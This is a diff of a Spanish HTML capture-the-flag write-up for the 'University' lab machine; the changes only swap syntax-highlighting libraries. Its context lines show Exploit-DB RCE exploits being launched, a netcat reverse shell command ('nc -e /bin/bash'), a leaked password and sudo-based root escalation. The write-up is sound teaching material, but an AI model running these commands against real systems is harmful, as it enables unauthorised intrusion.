@@ -19,7 +19,9 @@
     <link rel="shortcut icon" href="../../assets/img/favicon.ico">
     
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
-    <link rel="stylesheet" href="../../assets/css/prism.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
+    <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
+    <script src="../../assets/highlight/highlight.min.js"></script>
     <link rel="stylesheet" href="../../assets/css/hmv_w.css">  
 </head>
 <body>
@@ -45,7 +47,7 @@ PORT   STATE SERVICE
 </code></pre>
             <h3>Escaneo de servicios</h3>
 <pre class="pre">
-<code class="language-txt">❯ nmap -sVC -v -p 22,80 192.168.1.28
+<code class="code language-txt">❯ nmap -sVC -v -p 22,80 192.168.1.28
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
@@ -74,12 +76,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
             <img class="img_b" src="../../assets/img/hmv_university/university_login.png" alt="university_login">
             
             <p>En el escaneo de servicios me llama la atención<code class="code_negrita">&nbsp;Online-Admission-System&nbsp;</code>Buscando en internet<code class="code_negrita">&nbsp;exploit Online-Admission-System&nbsp;</code>he encontrado el siguiente exploit.</p>
-<pre class="pre"><code class="language-txt">https://www.exploit-db.com/exploits/50623         
+<pre class="pre"><code class="code language-txt">https://www.exploit-db.com/exploits/50623         
 </code></pre>
             
             <p>Lanzo el exploit y obtengo una shell.</p>
             
-<pre class="pre"><code class="language-txt">❯ python3 exploit.py -t 192.168.1.28 -p 80 -L 192.168.1.18 -P 443
+<pre class="pre"><code class="code language-txt">❯ python3 exploit.py -t 192.168.1.28 -p 80 -L 192.168.1.18 -P 443
 Exploit for Online Admission System 1.0 - Remote Code Execution (Unauthenticated)
 [*] Resolving URL...
 [*] Uploading the webshell payload...
@@ -100,10 +102,10 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
             <p>Una vez tengo acceso me lanzo otra shell para no perder la conexión ya que con este exploit se cierra la conexión.</p>
             
-<pre class="pre"><code class="language-txt">$ nc -e /bin/bash 192.168.1.18 1234
+<pre class="pre"><code class="code language-txt">$ nc -e /bin/bash 192.168.1.18 1234
 </code></pre>
             <p>Obtengo la shell.</p>
-<pre class="pre"><code class="language-txt">❯ nc -lvnp 1234
+<pre class="pre"><code class="code language-txt">❯ nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [192.168.1.18] from (UNKNOWN) [192.168.1.28] 52478
 </code></pre>
@@ -111,7 +113,7 @@ connect to [192.168.1.18] from (UNKNOWN) [192.168.1.28] 52478
             <h3>User pivoting</h3>
         
             <p>Dentro del directorio html hay un archivo oculto, el contenido del archivo es la contraseña de Sandra.</p>
-<pre class="pre"><code class="language-txt">www-data@university:~/html$ ls -la
+<pre class="pre"><code class="code language-txt">www-data@university:~/html$ ls -la
 total 16
 drwxr-xr-x  3 root     root     4096 Jan 18  2022 .
 drwxr-xr-x  3 root     root     4096 Jan 18  2022 ..
@@ -124,43 +126,43 @@ Myyogaiseasy
             
             <p>Me logueo como Sandra y empiezo a enumerar el sistema para elevar privilegios.</p>
             
-<pre class="pre"><code class="language-txt">sandra@university:~$ sudo -l
+<pre class="pre"><code class="code language-txt">sandra@university:~$ sudo -l
 User sandra may run the following commands on university:
     (root) NOPASSWD: /usr/local/bin/gerapy
 </code></pre>
 
             <p>Página oficial de Gerapy.</p>
 
-<pre class="pre"><code class="language-txt">https://docs.gerapy.com/en/latest/usage.html#database-configuration
+<pre class="pre"><code class="code language-txt">https://docs.gerapy.com/en/latest/usage.html#database-configuration
 </code></pre>
 
             <p>Creo un nuevo proyecto con el comando gerapy.</p>
 
-<pre class="pre"><code class="language-txt">sandra@university:~$ sudo /usr/local/bin/gerapy init
+<pre class="pre"><code class="code language-txt">sandra@university:~$ sudo /usr/local/bin/gerapy init
 Initialized workspace gerapy
 </code></pre>
 
             <p>Entro en el directorio gerapy e inicio la base de datos.</p>
 
-<pre class="pre"><code class="language-txt">sandra@university:~/gerapy$ sudo /usr/local/bin/gerapy migrate
+<pre class="pre"><code class="code language-txt">sandra@university:~/gerapy$ sudo /usr/local/bin/gerapy migrate
 </code></pre>
 
             <p>Creo el usuario admin por defecto.</p>
 
-<pre class="pre"><code class="language-txt">sandra@university:~/gerapy$ sudo /usr/local/bin/gerapy initadmin
+<pre class="pre"><code class="code language-txt">sandra@university:~/gerapy$ sudo /usr/local/bin/gerapy initadmin
 </code></pre>
 
             <p>Inicio gerapy para que se pueda acceder de forma pública.</p>
 
-<pre class="pre"><code class="language-txt">sandra@university:~/gerapy$ sudo /usr/local/bin/gerapy runserver 0.0.0.0:8000
+<pre class="pre"><code class="code language-txt">sandra@university:~/gerapy$ sudo /usr/local/bin/gerapy runserver 0.0.0.0:8000
 </code></pre>
             <p>Desde mi máquina atacante accedo a gerapy por el puerto 8000.</p>
             <img class="img_b" src="../../assets/img/hmv_university/gerapy_dashboard.png" alt="gerapy_dashboard">
             <p>Para obtener el root usaré otro exploit</p>
-<pre class="pre"><code class="language-txt">https://www.exploit-db.com/exploits/50640
+<pre class="pre"><code class="code language-txt">https://www.exploit-db.com/exploits/50640
 </code></pre>
             <p>Lanzo el exploit desde mi máquina y obtengo el root.</p>
-<pre class="pre"><code class="language-txt">❯ python3 gerapy.py -t 192.168.1.28 -p 8000 -L 192.168.1.18 -P 4444
+<pre class="pre"><code class="code language-txt">❯ python3 gerapy.py -t 192.168.1.28 -p 8000 -L 192.168.1.18 -P 4444
   ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
  / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
 | |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
@@ -192,7 +194,8 @@ uid=0(root) gid=0(root) groups=0(root)
     </main>
         <footer class="footer">
             <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
-            <script src="../../assets/js/prism.js"></script> 
+            <script src="../../assets/highlight/highlight.min.js"></script>
+            <script>hljs.initHighlightingOnLoad();</script> 
 
         </footer>  
 </body>
